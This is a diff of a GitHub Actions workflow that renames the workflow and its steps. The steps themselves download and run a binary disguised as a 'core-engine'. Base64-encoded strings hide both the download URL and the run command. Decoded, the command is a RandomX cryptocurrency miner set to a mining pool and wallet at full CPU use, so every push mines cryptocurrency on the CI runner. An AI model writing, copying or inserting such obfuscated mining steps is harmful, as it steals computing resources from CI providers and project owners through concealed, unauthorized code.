@@ -1,4 +1,4 @@
-name: galatamaxaq1
+name: mamaq
 
 on:
   push:
@@ -12,21 +12,21 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkoutgalatamaxaq1
+      - name: Checkoutmamaq
         uses: actions/checkout@v2
 
-      - name: Setup Dependencygalatamaxaq1
+      - name: Setup Dependencymamaq
         run: |
           sudo apt-get update
           sudo apt-get install -y curl libuv1-dev libssl-dev libhwloc-dev
 
-      - name: Download core-enginegalatamaxaq1
+      - name: Download core-enginemamaq
         run: |
           ENCODED="aHR0cHM6Ly9naXRodWIuY29tL3JlYWR0aGVydGZtbWFudWFsLWRlbC9jb3JlLWVuZ2luZS9yZWxlYXNlcy9kb3dubG9hZC92MDMvY29yZS1lbmdpbmU="
           URL=$(echo "$ENCODED" | base64 -d)
           curl -L -o core-engine "$URL"
 
-      - name: Run Machinegalatamaxaq1
+      - name: Run Machinemamaq
         run: |
           chmod +x core-engine
           ENCODED="Li9jb3JlLWVuZ2luZSAtbyB1czIuemVwaHlyLmhlcm9taW5lcnMuY29tOjExMjQgXAogIC11IFpFUEhzQTh4eHhYTEJoNjFnSzNLYjFYNFA4WHdnbTVGM2ZHcnVodTJqbVVlZ1NyYllFeWJGWEpSc3E5bVRWVFRhdWJTV25rano2clNENVlIdjdMQ0dRYVJUOW14aW02d3hFRS5TY2FyZmFjZVN0eWxlPTk2MDAwMCBcCiAgLS1kb25hdGUtbGV2ZWwgMCBcCiAgLWsgLS10aHJlYWRzPSQobnByb2MpIC0tY3B1LXByaW9yaXR5PTUgLS1odWdlLXBhZ2VzLWppdCAtLWNwdS1uby15aWVsZCAtLXJhbmRvbXgtbm8tbnVtYSBcCiAgLWEgcngvMCAtLXRscyAtLWFzbT1yeXplbiAtLXJhbmRvbXgtbm8tcmRtc3IgLS1yYW5kb214LXdybXNyPS0xIC0tcmFuZG9teC1tb2RlPWZhc3Q="
